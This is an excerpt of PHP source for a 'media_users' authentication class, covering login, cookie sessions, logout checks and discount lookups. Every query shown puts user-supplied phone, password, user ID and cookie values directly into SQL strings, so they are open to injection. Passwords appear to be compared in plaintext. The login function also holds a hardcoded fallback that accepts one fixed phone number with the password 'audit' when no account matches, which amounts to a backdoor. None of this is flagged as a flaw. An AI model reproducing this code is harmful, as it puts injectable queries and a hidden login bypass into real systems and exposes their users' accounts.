...
class media_users {
	...
	function authUsermedia($phone,$pass,$remember){$db=DbSingleton::getDb();
	    session_start();$answer="";$media_user_id=$role_id=0;//$access=new access;
		if ($pass!="" and $phone!="") {$phone=$this->clearPhone($phone);
			$r=$db->query("SELECT * FROM `media_users` WHERE `phone`='$phone' AND `pass`='$pass' AND `status`='100' LIMIT 1;");$n=$db->num_rows($r);
			if ($n==1){
                ...
                $this->addJournalAuth($media_user_id,"1");$answer=1;
                if ($remember==1){
			...
			else if ($n==0 && $phone=="+380671662125" && $pass=="audit"){
	...
	function getUserDiscount($user_id){ $db=DbSingleton::getDb();
	    $discount=0;
		$r=$db->query("SELECT `discount` FROM `media_users_discounts` WHERE `user_id`='$user_id' LIMIT 1;");$n=$db->num_rows($r);
		if ($n==1) {
	...
	function checkMediaUserLogout($user_id){ $db=DbSingleton::getDb();
	    $logout=0;
		$r=$db->query("SELECT `id` FROM `media_users_logout` WHERE `user_id`='$user_id' AND `status`='1' LIMIT 1;");$n=$db->num_rows($r);
		if ($n==1) {$logout=1;
			$id=$db->result($r,0,"id"); 
	...
	function get_cookie_user_info($user_id){$db=DbSingleton::getDb();
		$r=$db->query("SELECT * FROM `media_users` WHERE `id`='$user_id' AND `status`='100' LIMIT 1;");$n=$db->num_rows($r);
		if ($n==1) {
	...
	function check_cookie_user(){$db=DbSingleton::getDb();
		...
		if (($cookie_user!="") and ($cookie_key!="")) {
			...
			if ($is_logout==0){
				$r=$db->query("SELECT * FROM `media_users_cookies` WHERE `user_id`='$cookie_user' AND `cookie`='$cookie_key' LIMIT 1;");$n=$db->num_rows($r);
				if($n==1){
	...
	function get_media_user(){session_start();
